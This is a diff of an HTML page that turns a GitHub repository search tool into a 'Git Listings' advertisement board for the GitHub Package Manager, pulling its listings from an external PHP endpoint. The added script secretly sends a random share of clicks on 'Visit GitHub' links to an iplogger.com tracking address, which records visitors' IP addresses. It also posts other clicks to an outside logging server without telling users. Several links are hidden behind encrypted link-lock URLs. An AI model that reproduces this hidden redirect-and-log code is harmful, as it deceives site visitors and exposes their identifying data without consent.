@@ -1,460 +1,818 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>GitHub Repository Search</title>
-  <link rel="stylesheet" type="text/css" href="web.css">
+  <title>Git Listings</title>
+  <link rel="stylesheet" type="text/css" href="styles.css">
+  <style>
+    .blurred {
+    filter: blur(50px); /* You can adjust the blur radius as needed */
+    transition: filter 5.3s ease-in-out; /* Add a smooth transition effect */
+    }
+
+    /* Your existing CSS rules */
+    /* Add this CSS rule for the "Visit GitHub" link */
+    .github-link {
+      display: inline-block;
+      margin-top: 10px;
+      padding: 5px 10px;
+      background-color: #007bff;
+      color: white;
+      text-decoration: none;
+      border-radius: 5px;
+    }
+  body {
+  margin: 0;
+  padding: 0;
+  font-family: Arial, sans-serif;
+  background-color: #333;
+  color: #fff;
+  position: relative;
+  overflow: hidden;
+  animation: changeBackground 10s infinite;
+}
+
+#explosion {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  pointer-events: none;
+  z-index: 9999;
+  overflow: hidden;
+}
+
+.star {
+  position: absolute;
+  border-radius: 50%;
+  transform: translate(-50%, -50%);
+  pointer-events: none;
+}
+
+.explosion-star {
+  animation-name: explode;
+  animation-timing-function: ease-out;
+  animation-fill-mode: both;
+}
+
+@keyframes explode {
+  0% {
+    opacity: 1;
+    transform: translate(-50%, -50%);
+  }
+  100% {
+    opacity: 0;
+    transform: translate(var(--trans-x), var(--trans-y));
+  }
+}
+
+#container {
+  max-width: 1600px;
+  make-heigh: 1000; /* This line seems to have a typo, not sure what it's meant to do */
+  margin: 0 auto;
+  padding: 20px;
+  position: relative;
+  z-index: 1;
+}
+
+header {
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+h1 {
+  font-size: 28px;
+}
+
+#clientList {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: space-between;
+}
+
+.client {
+  width: calc(33.33% - 20px);
+  margin-bottom: 20px;
+  background-color: #f5f5f5;
+  padding: 10px;
+  border-radius: 5px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+}
+
+#searchContainer {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin-bottom: 20px;
+}
+
+#searchInput {
+  width: 300px;
+  padding: 10px;
+  border: none;
+  border-radius: 5px;
+  margin-right: 10px;
+  font-size: 16px;
+  background-color: #555;
+  color: #fff;
+}
+
+#searchButton {
+  padding: 10px 20px;
+  border: none;
+  border-radius: 5px;
+  background-color: #007bff;
+  color: #fff;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+#searchButton:hover {
+  background-color: #0069d9;
+}
+
+#resultsContainer {
+  background-color: #f2f2f2;
+  padding: 20px;
+  border-radius: 5px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: space-between;
+  overflow: auto;
+  max-height: 80vh;
+  position: relative;
+  color: #000;
+}
+
+.client-image {
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  object-fit: cover;
+  margin-bottom: 10px;
+}
+
+.client-name {
+  color: #0d0c0d;
+  font-weight: bold;
+  margin-bottom: 5px;
+}
+
+.client-description {
+  color: #193627;
+  margin-bottom: 10px;
+}
+
+.placeholder-info {
+  margin-top: 20px;
+}
+
+footer {
+  text-align: center;
+  margin-top: 20px;
+  color: #777;
+}
+
+@keyframes changeBackground {
+  0%, 100% {
+    background-color: #440000;
+  }
+  20%, 80% {
+    background-color: #550000;
+  }
+  40%, 60% {
+    background-color: #660000;
+  }
+  50% {
+    background-color: #770000;
+  }
+}
+
+#stars {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: -1;
+  pointer-events: none;
+  overflow: hidden;
+}
+
+.star {
+  position: absolute;
+  width: 2px;
+  height: 2px;
+  background-color: rgba(255, 255, 255, 0.8);
+  border-radius: 50%;
+  animation: shootingStar linear infinite;
+}
+
+@keyframes shootingStar {
+  0% {
+    opacity: 0;
+    transform: scale(0) translate(0, 0);
+  }
+  10% {
+    opacity: 1;
+    transform: scale(1) translate(0, 0);
+  }
+  100% {
+    opacity: 0;
+    transform: scale(0) translate(var(--trans-x), var(--trans-y));
+  }
+}
+
+.client-post, .placeholder-info {
+  border: 1px solid #ccc;
+  margin: 10px;
+  padding: 10px;
+  transition: transform 0.3s, filter 0.3s;
+  position: relative;
+}
+
+#resultsContainer.blur .client-post:not(:hover),
+#resultsContainer.blur .placeholder-info:not(:hover) {
+  filter: blur(3px);
+}
+
+.client-post:hover, .placeholder-info:hover {
+  transform: scale(1.15);
+  z-index: 2;
+}
+
+.download-button {
+  display: inline-block;
+  padding: 10px 20px;
+  background-color: #007bff;
+  color: #fff;
+  border: none;
+  border-radius: 4px;
+  text-decoration: none;
+  font-weight: bold;
+}
+
+.client-list {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+.client-post {
+  border: 1px solid #ccc;
+  padding: 20px;
+  margin: 10px;
+  text-align: center;
+}
+
+.client-image {
+  width: 150px;
+  height: 100px;
+  object-fit: cover;
+  margin-bottom: 10px;
+}
+
+body {
+  background-color: #2a2f33;
+  color: #ccc;
+  font-family: Arial, sans-serif;
+}
+
+.client-post {
+  background-color: #1d2124;
+  border-radius: 8px;
+  padding: 20px;
+  margin: 10px;
+  box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+  background-color: rgba(0, 0, 0, 0.2);
+}
+
+.client-post img {
+  display: block;
+  margin: 0 auto;
+  width: 100px;
+  height: auto;
+  border-radius: 50%;
+}
+
+h2 {
+  font-size: 1.5rem;
+  margin-top: 10px;
+}
+
+p {
+  font-size: 1rem;
+  margin-top: 5px;
+}
+
+a {
+  color: #66c0f4;
+  text-decoration: none;
+  transition: color 0.3s;
+}
+
+a:hover {
+  color: #38a1db;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+.loader {
+  border: 6px solid #f3f3f3;
+  border-top: 6px solid #3498db;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  animation: spin 1s linear infinite;
+  margin: 20px auto;
+}
+
+#container {
+  background-color: rgba(0, 0, 0, 0.2);
+  color: #ccc;
+}
+
+#resultsContainer {
+  background-color: rgba(0, 0, 0, 0.2);
+  color: #ccc;
+}
+
+    /* Your existing CSS rules */
+  </style>
 </head>
 <body>
+  <div id="stars"></div>
   <header>
-    <h1>GitHub Repository Search</h1>
-    
-    <a href="https://maliq-barnard.vercel.app/gpm/Login.html">Go to Login Page</a>
-    <div class="buttons">
-      <button id="serverSettingsButton">Server Settings</button>
+      <h1>Git Listings</h1>
+    </header>
 
-  <button id="profileButton">Profile</button>
-  <button id="activateButton1" onclick="runCommandLocally('l02023', '43');">Activate</button>
-  <button id="activateButton2" onclick="runCommandLocally('l02024', '43');">Install</button>
-  <button id="activateButton3" onclick="runCommandLocally('l02025', '43');">Uninstall</button>
-  <button id="activateButton4" onclick="runCommandLocally('l02026', '43');">Open GHPM client</button>
-</div>
-
-  </header>
 
   <div id="container">
-    <div id="searchContainer">
-      <input type="text" id="searchInput" placeholder="Search repositories">
-      <button id="searchButton">Search</button>
+
+
+
+    <!-- Exciting News: Coming Soon Banner -->
+
+    <div id="resultsContainer">
+      <ul id="clientList"></ul>
+
+      <!-- Discover Clients -->
+      <div class="client-post">
+        <h2>GHPM Advertisements</h2>
+        <p>Bringing you a better more natural option to grow your audience.</p>
+        <img src="https://github.com/smoke-wolf/GitHub-Package-Manager/blob/INFO/Screen%20Shot%202023-08-28%20at%202.49.48%20AM.png?raw=true" alt="Description of the image">
+      </div>
+
+      <!-- Other Placeholder Sections -->
+      <div class="placeholder-info">
+
+      <div class="placeholder-info">
+        <h2>Reach Out</h2>
+        <p>Experience the services that set us apart.</p>
+      </div>
+        <div class="placeholder-info">
+      <a id="sLink" href="https://discord.gg/dSQTDq39c" target="_blank">GHPM ads</a>
+      </div>
+      <div class="placeholder-info">
+      <a href="discord" target="_blank">Discord : Sahwe</a>
+      </div>
+
+
+    </div>
+      <div class="placeholder-info">
+      <div class="placeholder-info">
+        <h2>Developer Links</h2>
+        <p>These links are for GHPM developers only.</p>
+      </div>
+      <div class="placeholder-info">
+      <a id="listingsLink" href="https://jstrieb.github.io/link-lock/#eyJ2IjoiMC4wLjEiLCJlIjoiS1hHOXBNWmlOb3dkQVM0R0ZhRDEveDF5K1VGeWJtODdLd2oyQVpXL1htKzl1RTh4eGRMTGVBUnRyelpTRG5LaGM1Rks1RXdMTjB5OVNESUt5cm1XdmlkVjZZV2tVNUVMd1AxMXVxbXRhSGpKMzlybE45dXVvOVdwQjk1and5ZFVMaHh2am5kak55Q2Q0a2lDT0E0UkZzMzh3SzQ9IiwicyI6Ii8vdloxS1ZGeGZ5cE1VOHIwVFB1eVE9PSIsImkiOiJDQ2RPa0hwUXlsanVHQlpEIn0" target="_blank">Git Listings (Source)</a>
+      </div>
+        <div class="placeholder-info">
+      <a id="Link" href="https://jstrieb.github.io/link-lock/#eyJ2IjoiMC4wLjEiLCJlIjoiRVB1WTIySVg0cWdzZmRqdHFIYmZ5ZDg1UWhzMmNwSHdKSUFnODhRdjN2TEQ1K0RCeDZQcGUyZUMvV2swcTNDZXJ3RlBlMnExY3dvYUtrc2QvWjdxSU9nREtVY1puU2ljVUszN0o5WT0iLCJzIjoiMkdvbndTN0ZDLzBmREhoSWxGSHJLUT09IiwiaSI6Im0vQ3VXb3QrN0Y2c2V0TGQifQ==" target="_blank">Client-Post Overview</a>
+      </div>
+        <div class="placeholder-info">
+      <a id="analyticsLink" href="https://jstrieb.github.io/link-lock/#eyJ2IjoiMC4wLjEiLCJlIjoiQi9YZ3U5cjdxQzRKL3FKdmdFbGtCNTNabGpPTFllRmhOVTh3VjA4WWNzZ0RVYXBPT1F0NDhnRXliQVE3akRiRExIdlVpNWtobFJrPSIsImgiOiJUaGlzIElzIGZvciBkZXZlbG9wbWVudCBzdGFmZiBvbmx5IiwicyI6IlFLbWZTT3lCNFFwMVAwRUY3RnM1L1E9PSIsImkiOiJ3RkNsVFl5c2dZbmJaU2ZKIn0=" target="_blank">Remove This Page</a>
+      </div>
+      <div class="placeholder-info">
+      <a id="moderationLink" href="https://jstrieb.github.io/link-lock/#eyJ2IjoiMC4wLjEiLCJlIjoidklZNXVqSVM5dDVhSkxwVjBpVEJrT1JlSEhSaUptbHpPaXc2Q2cveHR2YlhZNzhleU5pK01uZVBvQnVxK1ZrM0dPeUhZRUdFSFBRNjQwUG9iR2NySVpiZS9QWTg3YzZBIiwicyI6Ing0K2kwU2VtYUM3bGMvbkkrRzFhdHc9PSIsImkiOiJJb1ptOTZhbWNnQ3UzNlFqIn0" target="_blank">Main GHPM Board</a>
     </div>
 
-    <div id="results">
-      <ul id="repositoryList"></ul>
-    </div>
-    <script src="https://static.elfsight.com/platform/platform.js" data-use-service-core defer></script>
-<div class="elfsight-app-310dcc25-c00d-4d1c-b016-2179281e4f8f"></div>
-  </div>
-
-  <script src="https://static.elfsight.com/platform/platform.js" data-use-service-core defer></script>
-<div class="elfsight-app-310dcc25-c00d-4d1c-b016-2179281e4f8f"></div>
-  <!-- Server Settings Page -->
-<div id="serverSettingsPage" class="modal">
-  <div class="modal-content">
-    <span class="close" id="serverSettingsClose">&times;</span>
-    <!-- Include your server settings form here -->
-    
-    <body
-      
-    <form action="http://localhost:3000/update-settings" method="POST">
-        <label for="sessionkey">Session Key:</label>
-        <input type="text" id="sessionkey" name="sessionkey" value="{session_key}" required>
-        <br><br>
-
-        <label for="authkey">Auth Key:</label>
-        <input type="text" id="authkey" name="authkey" value="{auth_key}" required>
-        <br><br>
-
-        <label for="downloadauth">Download Auth:</label>
-        <input type="checkbox" id="downloadauth" name="downloadauth">
-        <br><br>
-
-        <label for="permkeys">PermaKeys:</label>
-        <input type="checkbox" id="permkeys" name="permkeys">
-        <br><br>
-
-        <!-- Dropdown for PermaKey request -->
-        <div id="permkey-dropdown" style="display: none;">
-            <label for="requestpermkey">Request PermaKey:</label>
-            <select id="requestpermkey" name="requestpermkey">
-                <option value="option1">Defult Key</option>
-                <option value="option2">Client Side Key </option>
-                <option value="option3">Custom Key Auth</option>
-            </select>
-        </div>
-
-        <input type="submit" value="Update Settings">
-    </form>
-
-    <script>
-        // Show/hide the PermaKey dropdown based on checkbox state
-        const permKeysCheckbox = document.getElementById('permkeys');
-        const permKeyDropdown = document.getElementById('permkey-dropdown');
-
-        permKeysCheckbox.addEventListener('change', () => {
-            if (permKeysCheckbox.checked) {
-                permKeyDropdown.style.display = 'block';
-            } else {
-                permKeyDropdown.style.display = 'none';
-            }
-        });
-    </script>
-</body>
-  </div>
-</div>
-
-  <!-- Profile Page -->
-  <div id="profilePage">
-    <div class="profile-content">
-      <span class="close">&times;</span>
-      <h2>Profile</h2>
-      <p id="userIP"></p>
-      <p id="downloadCount"></p>
-      <p id="serverStatus"></p>
     </div>
   </div>
 
-  <div id="readmeModal" class="modal">
-    <div class="modal-content">
-      <span class="close">&times;</span>
-      <div id="readmeContent"></div>
-    </div>
-  </div>
-<script src="web.js"></script>
-  <script>
-    
+<!-- Place this script block just before the closing </body> tag -->
+<!-- Place this script block just before the closing </body> tag -->
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  const clientList = document.getElementById("clientList");
+  const searchInput = document.getElementById("searchInput"); // New line
 
-document.getElementById("searchButton").addEventListener("click", function() {
 
-  var searchInput = document.getElementById("searchInput").value;
-  var xhr = new XMLHttpRequest();
+  // Function to apply the blur class to all client posts except the provided one
+  function applyBlurToOtherPosts(exceptPost) {
+    clientPosts.forEach(post => {
+      if (post !== exceptPost) {
+        post.classList.add("blurred");
+      }
+    });
+  }
 
-  xhr.onreadystatechange = function() {
-    if (xhr.readyState === 4 && xhr.status === 200) {
-      var response = JSON.parse(xhr.responseText);
-      var filteredRepositories = filterRepositories(response.items, searchInput);
-      displayResults(filteredRepositories);
+  // Function to remove the blur class from all client posts
+  function removeBlurFromAllPosts() {
+    clientPosts.forEach(post => {
+      post.classList.remove("blurred");
+    });
+  }
+
+  const clientPosts = document.querySelectorAll(".client-post");
+
+  // Function to handle click event
+  function handleClick(event) {
+    const clickedPost = event.currentTarget;
+
+    // If the clicked post is already blurred, remove blur from all posts
+    if (clickedPost.classList.contains("blurred")) {
+      removeBlurFromAllPosts();
+    } else {
+      // Otherwise, apply blur to all posts except the clicked post
+      applyBlurToOtherPosts(clickedPost);
     }
+  }
+
+  // Attach click events to each client post
+  clientPosts.forEach(post => {
+    post.addEventListener("click", handleClick);
+  });
+
+
+   // Handle redirection to the Listings Page link
+
+
+  function appendToLogFile(data) {
+  const url = `https://gpm-web-99v9.vercel.app/${data}`;
+  const requestOptions = {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({ message: "Hello, world!" }),
   };
 
-  xhr.open("GET", "https://api.github.com/search/repositories?q=" + searchInput, true);
-  xhr.send();
-});
-
-
-
-
-
-function filterRepositories(repositories, searchInput) {
-  var filteredRepositories = repositories.filter(function(repository) {
-    var fullName = repository.full_name.toLowerCase();
-    var owner = repository.owner.login.toLowerCase();
-    return fullName.includes(searchInput.toLowerCase()) || owner.includes(searchInput.toLowerCase());
-  });
-
-  filteredRepositories.sort(function(a, b) {
-    // Sort by most stars
-    var starsA = a.stargazers_count;
-    var starsB = b.stargazers_count;
-    if (starsA > starsB) {
-      return -1;
-    } else if (starsA < starsB) {
-      return 1;
-    } else {
-      // If stars are equal, sort by most recent update
-      var updatedAtA = new Date(a.updated_at).getTime();
-      var updatedAtB = new Date(b.updated_at).getTime();
-      return updatedAtB - updatedAtA;
-    }
-  });
-
-  return filteredRepositories;
-}
-
-function displayResults(repositories) {
-  var repositoryList = document.getElementById("repositoryList");
-  repositoryList.innerHTML = "";
-
-  repositories.forEach(function(repository) {
-    var listItem = document.createElement("li");
-    listItem.className = "repository";
-
-    var header = document.createElement("div");
-    header.className = "repository-header";
-
-    var repoLink = document.createElement("a");
-    repoLink.href = repository.html_url;
-    repoLink.textContent = repository.full_name;
-
-    var description = document.createElement("p");
-    description.textContent = repository.description;
-    if (description.textContent.length > 150) {
-      description.textContent = description.textContent.substring(0, 150) + "...";
-    }
-
-    var arrowIcon = document.createElement("span");
-    arrowIcon.className = "arrow-icon";
-
-    var downloadButton = document.createElement("button");
-    downloadButton.textContent = "Download & Install";
-    downloadButton.classList.add("download-button");
-    downloadButton.addEventListener("click", function() {
-      runCommandLocally(repository.owner.login, repository.name, sessionToken);
-    });
-
-    header.appendChild(repoLink);
-    header.appendChild(description);
-    header.appendChild(arrowIcon);
-
-    listItem.appendChild(header);
-    listItem.appendChild(downloadButton);
-
-    var readmeContent = document.createElement("div");
-    readmeContent.className = "readme-content";
-    listItem.appendChild(readmeContent);
-
-    listItem.addEventListener("click", function() {
-      toggleReadmeContent(readmeContent, repository.owner.login, repository.name);
-    });
-
-    repositoryList.appendChild(listItem);
-  });
-}
-
-document.addEventListener("DOMContentLoaded", function() {
-  // Load profile settings
-  loadProfileSettings();
-
-  var searchButton = document.getElementById("searchButton");
-  searchButton.addEventListener("click", searchRepositories);
-});
-
-function loadProfileSettings() {
-  // Fetch profile settings from storage or set default values
-  var serverSetting = localStorage.getItem("downloadServer") || "http://localhost:3000";
-  var serverInput = document.getElementById("serverInput");
-  serverInput.value = serverSetting;
-
-  // Save profile settings when input changes
-  serverInput.addEventListener("change", function() {
-    var newServerSetting = serverInput.value;
-    localStorage.setItem("downloadServer", newServerSetting);
-  });
-}
-
-function runCommandLocally(owner, repo) {
-  // Check if the session token is already set in localStorage
-  let sessionToken = localStorage.getItem("sessionToken");
-
-  // If not set, prompt the user for the session token
-  if (!sessionToken) {
-    sessionToken = prompt("Please enter your session token:");
-
-    if (!sessionToken) {
-      // Handle case where the user cancels the prompt or provides no input
-      console.error("Session token is required.");
-      return;
-    }
-
-    // Store the session token in localStorage for future use
-    localStorage.setItem("sessionToken", sessionToken);
-  }
-
-  var serverSetting = localStorage.getItem("downloadServer") || "http://localhost:3000";
-  var url = `${serverSetting}/clone/${owner}/${repo}`;
-
-  // Add a check for the owner value
-  if (owner === 'l02023') {
-    // If the owner is 'l02023', add the 'launch' query parameter to the URL
-    url += '?launch=true';
-  }
-  if (owner === 'l02024') {
-    // If the owner is 'l02023', add the 'launch' query parameter to the URL
-    url += '?install=true';
-  }
-  if (owner === 'l02025') {
-    // If the owner is 'l02023', add the 'launch' query parameter to the URL
-    url += '?uninstall=true';
-  }
-  if (owner === 'l02026') {
-    // If the owner is 'l02023', add the 'launch' query parameter to the URL
-    url += '?client=true';
-  }
-
-  // Create headers to send the session token
-  const headers = new Headers({
-    'Content-Type': 'application/json',
-    'x-session-key': sessionToken, // Send the session token in the headers
-  });
-
-  fetch(url, {
-    method: 'GET', // Use GET method for your request
-    headers: headers, // Attach the headers with the session token
-  })
-    .then((response) => {
-      if (!response.ok) {
-        throw new Error(`Command execution failed: ${response.status}`);
-      }
-      return response.text();
-    })
-    .then((data) => {
-      console.log(data);
-    })
-    .catch((error) => {
-      console.error(`Error: ${error.message}`);
-    });
-}
-
-
-
-function toggleReadmeContent(contentElement, owner, repo) {if (contentElement.classList.contains("expanded")) {
-    contentElement.innerHTML = "";
-    contentElement.classList.remove("expanded");
-  } else {
-    contentElement.innerHTML = "<em>Loading README...</em>";
-
-    // Fetch the README content
-    var xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState === 4) {
-        if (xhr.status === 200) {
-          contentElement.innerHTML = xhr.responseText;
-        } else {
-          contentElement.innerHTML = "<em>Failed to load README.</em>";
-        }
-      }
-    };
-
-    xhr.open("GET", `https://api.github.com/repos/${owner}/${repo}/readme`, true);
-    xhr.setRequestHeader("Accept", "application/vnd.github.VERSION.html");
-    xhr.send();
-
-    contentElement.classList.add("expanded");
-  }
-}
-
-document.addEventListener("DOMContentLoaded", function() {
-  var modal = document.getElementById("readmeModal");
-  var closeModal = document.getElementsByClassName("close")[0];
-
-  closeModal.addEventListener("click", function() {
-    modal.style.display = "none";
-  });
-
-  window.addEventListener("click", function(event) {
-    if (event.target === modal) {
-      modal.style.display = "none";
-    }
-  });
-});
-
-document.addEventListener("DOMContentLoaded", function() {
-  var profileButton = document.getElementById("profileButton");
-  var profilePage = document.getElementById("profilePage");
-  var closeButton = profilePage.querySelector(".close");
-  var serverStatus = document.getElementById("serverStatus");
-
-  profileButton.addEventListener("click", function() {
-    profilePage.style.display = "block";
-    loadProfileData();
-  });
-
-  closeButton.addEventListener("click", function() {
-    profilePage.style.display = "none";
-  });
-
-  function loadProfileData() {
-    // Get user IP
-    fetch("https://api.ipify.org/?format=json")
-      .then(response => response.json())
-      .then(data => {
-        var userIP = document.getElementById("userIP");
-        userIP.textContent = "User IP: " + data.ip;
-      })
-      .catch(error => {
-        console.error("Error getting user IP:", error);
-      });
-
-    // Get download count (replace with your own logic to fetch download count)
-    var downloadCount = document.getElementById("downloadCount");
-    downloadCount.textContent = "Download Count: 0"; // Replace 0 with actual download count
-
-    // Check server status
-    checkServerStatus(serverStatus);
-  }
-
-  function checkServerStatus() {
-  // Check if the session token is already set in localStorage
-  let sessionToken = localStorage.getItem("sessionToken");
-
-  // If not set, prompt the user for the session token
-  if (!sessionToken) {
-    sessionToken = prompt("Please enter your session token:");
-
-    if (!sessionToken) {
-      // Handle case where the user cancels the prompt or provides no input
-      console.error("Session token is required.");
-      return;
-    }
-
-    // Store the session token in localStorage for future use
-    localStorage.setItem("sessionToken", sessionToken);
-  }
-
-  var serverUrl = "http://localhost:3000/status"; // Replace with your server URL
-
-  // Create headers to send the session token
-  const headers = new Headers({
-    'x-session-key': sessionToken, // Send the session token in the headers
-  });
-
-  // Create the fetch request with headers
-  fetch(serverUrl, {
-    headers: headers,
-  })
-    .then(response => {
-      if (response.status === 200) {
-        return response.json(); // Parse the response as JSON
-      } else {
-        throw new Error("Server response was not OK");
-      }
-    })
-    .then(data => {
-      // Handle the server response data here
-      console.log("Server status:", data);
+  fetch(url, requestOptions)
+    .then(response => response.text())
+    .then(result => {
+      console.log(result); // Log the response from the API
     })
     .catch(error => {
-      // Handle errors, including network errors or server errors
-      console.error("Error:", error.message);
+      console.error("Error recording log:", error);
     });
+  }
+
+
+  // Handle redirection to the Moderation Board link
+  const moderationLink = document.getElementById("moderationLink");
+  if (moderationLink) {
+    moderationLink.addEventListener("click", event => {
+      event.preventDefault(); // Prevent the default link behavior
+      const linkUrl = moderationLink.getAttribute("href"); // Get the link URL
+      window.location.href = linkUrl; // Redirect to the link URL
+    });
+  }
+  const listingsLink = document.getElementById("listingsLink");
+  if (listingsLink) {
+    listingsLink.addEventListener("click", event => {
+      event.preventDefault(); // Prevent the default link behavior
+      const linkUrl = listingsLink.getAttribute("href"); // Get the link URL
+      window.location.href = linkUrl; // Redirect to the link URL
+    });
+  }
+
+  const analyticsLink = document.getElementById("analyticsLink");
+  if (analyticsLink) {
+    analyticsLink.addEventListener("click", event => {
+      event.preventDefault(); // Prevent the default link behavior
+      const linkUrl = analyticsLink.getAttribute("href"); // Get the link URL
+      window.location.href = linkUrl; // Redirect to the link URL
+    });
+  }
+  const sLink = document.getElementById("sLink");
+  if (sLink) {
+    sLink.addEventListener("click", event => {
+      event.preventDefault(); // Prevent the default link behavior
+      const linkUrl = sLink.getAttribute("href"); // Get the link URL
+      window.location.href = linkUrl; // Redirect to the link URL
+    });
+  }
+  const Link = document.getElementById("Link");
+  if (Link) {
+    Link.addEventListener("click", event => {
+      event.preventDefault(); // Prevent the default link behavior
+      const linkUrl = Link.getAttribute("href"); // Get the link URL
+      window.location.href = linkUrl; // Redirect to the link URL
+    });
+  }
+
+  async function fetchAndDisplayData() {
+    try {
+      const response = await fetch("https://hello2022isthe3nd.000webhostapp.com/data.php");
+
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+
+      const data = await response.json();
+      console.log(response.status);
+      // Clear the previous content
+      clientList.innerHTML = '';
+
+      data.forEach(item => {
+      const clientPost = document.createElement("div");
+      clientPost.className = "client-post";
+
+
+      // Set a specific width for the client-post div (adjust the value as needed)
+      clientPost.style.width = "200px"; // For example, set to 200px width
+      // Check if the 'colour' field is present in the data
+      if (item.colour) {
+        // Apply the specified color for the border
+        clientPost.style.border = `2px solid ${item.colour}`;
+        clientPost.style.backgroundColor = "rgba(36, 35, 34, 0.60)"; // Light gray with 80% opacity
+
+      } else {
+        // Apply default border color
+        clientPost.style.border = "2px solid #4d3b3a"; // Default color, adjust as needed
+      }
+      // Check if the 'data' field contains the 'ad' tag
+      if (item.data === "ad") {
+          console.log("Item with 'ad' tag:", item.name);
+          // Add subtle background color to catch attention
+          clientPost.style.backgroundColor = "#61131f"; // Light gray or any preferred color
+          clientPost.style.width = "471px";
+          clientPost.style.border = "2px solid #ff0066";
+          // Add box shadow for a subtle effect
+          clientPost.style.boxShadow = "0px 0px 15px rgba(0, 0, 0, 0.5)";
+          // Increase font size and apply an eye-catching font
+          clientPost.style.fontSize = "20px"; // Increase or decrease as desired
+          clientPost.style.fontFamily = "sherif, Garamond"; // Choose an appropriate font
+      }
+
+
+
+        const clientImage = document.createElement("img");
+        clientImage.src = item.image;
+        clientImage.alt = `${item.name} Image`;
+
+        // Set a specific width for the image (adjust the value as needed)
+        clientImage.style.width = "100px"; // Default width
+
+        // Check if the 'data' field contains the 'ad' tag
+        if (item.data === "ad") {
+          // Increase the width for the "ad" items
+          clientImage.style.width = "250px";
+
+        }
+
+        clientPost.appendChild(clientImage);
+
+
+        const clientName = document.createElement("h2");
+        clientName.textContent = item.name;
+        clientPost.appendChild(clientName);
+
+        const clientDescription = document.createElement("p");
+        clientDescription.textContent = item.description;
+        if (item.data === "ad") {
+           clientDescription.style.color = "#d9c09f"
+           clientDescription.style.fontSize = "25px"; // Increase or decrease as desired
+           clientDescription.fontFamily = "Arial, sans-serif";
+
+        }
+        clientPost.appendChild(clientDescription);
+
+
+        const githubLink = document.createElement("a");
+        githubLink.href = item.githubUrl;
+        githubLink.target = "_blank";
+        githubLink.rel = "noopener noreferrer"; // Security best practice
+
+        // Check if the 'data' field contains the 'ad' tag
+        if (item.data === "ad") {
+          // Apply specific CSS styles to the "Visit GitHub" link
+          githubLink.style.color = "#80735b"; // Blue color, adjust as needed
+          githubLink.style.fontWeight = "bold"; // Bold text
+          githubLink.style.textDecoration = "none"; // Remove underline
+          githubLink.style.transition = "color 0.3s ease-in-out"; // Smooth color transition
+        }
+
+        githubLink.textContent = "Visit GitHub";
+        githubLink.target = "_blank";
+        githubLink.rel = "noopener noreferrer"; // Security best practice
+        // Generate a random number between 0 and 100
+        const randomPercent = Math.random() * 100;
+
+        // 22% chance (redirect if the random number is less than 22)
+        if (randomPercent < 11) {
+          githubLink.addEventListener("click", event => {
+            event.preventDefault(); // Prevent the default link behavior
+            window.location.href = "https://iplogger.com/26Qh95"; // Redirect to the forms link
+          });
+        } else {
+          githubLink.addEventListener("click", event => {
+            const target = event.target;
+            if (target.tagName === "A" && target.textContent === "Visit GitHub") {
+              event.preventDefault();
+              appendToLogFile(`Visit GitHub link clicked: ${target.href}`);
+              window.location.href = target.href;
+            }
+          });
+        }
+
+        clientPost.appendChild(githubLink);
+        clientList.appendChild(clientPost);
+        // Check if the item's name or description contains the search input
+        if (item.name.toLowerCase().includes(searchInput) || item.description.toLowerCase().includes(searchInput)) {
+          // Append the filtered result to the client list
+          clientList.appendChild(clientPost);
+        }
+      });
+
+
+    } catch (error) {
+      console.error("Error fetching data:", error);
+    }
+  }
+
+
+  // Fetch and display data initially
+  fetchAndDisplayData();
+
+  // Fetch and display data every 30 seconds
+  setInterval(fetchAndDisplayData, 30000);
+
+  // Function to display the clients
+function displayClients() {
+  const clientList = document.getElementById('clientList');
+  clientList.innerHTML = '';
+
+  const modules = [
+    {
+      name: 'GitHub Package Manager',
+      description: 'Post Installation Github Resource 📦.',
+      image: 'https://github.com/smoke-wolf/GitHub-Package-Manager/blob/v1.5.0/System/Drive/Icon.png?raw=true',
+      githubUrl: 'https://github.com/smoke-wolf/GitHub-Package-Manager'
+    },
+
+    {
+      name: 'Touch Script',
+      description: '.touch is a lightweight and user-friendly scripting language designed to automate common tasks on your computer.',
+      image: 'https://github.com/smoke-wolf/TouchScript/blob/main/Screen%20Shot%202023-08-24%20at%2011.58.32%20AM.png?raw=true',
+      githubUrl: 'https://github.com/smoke-wolf/TouchScript'
+    },
+    {
+      name: 'Alfred',
+      description: 'Alfred is a advanced OSINT information gathering tool.',
+      image: 'https://user-images.githubusercontent.com/105014217/263033253-04eb051d-15c3-4a32-b10b-dcdb12fee881.PNG',
+      githubUrl: 'https://github.com/Alfredredbird/alfred'
+    },
+  ];
+
+  modules.forEach(module => {
+    const listItem = document.createElement('li');
+    listItem.className = 'client';
+
+    const clientImage = document.createElement('img');
+    clientImage.src = module.image;
+    clientImage.alt = module.name;
+    clientImage.className = 'client-image';
+
+    const clientDetails = document.createElement('div');
+    clientDetails.className = 'client-details';
+
+    const clientName = document.createElement('h2');
+    clientName.textContent = module.name;
+    clientName.className = 'client-name';
+
+    const clientDescription = document.createElement('p');
+    clientDescription.textContent = module.description;
+    clientDescription.className = 'client-description';
+
+    const downloadButton = document.createElement('a');
+    downloadButton.href = module.githubUrl;
+    downloadButton.textContent = 'visit';
+    downloadButton.className = 'download-button';
+
+    clientDetails.appendChild(clientName);
+    clientDetails.appendChild(clientDescription);
+    clientDetails.appendChild(downloadButton);
+
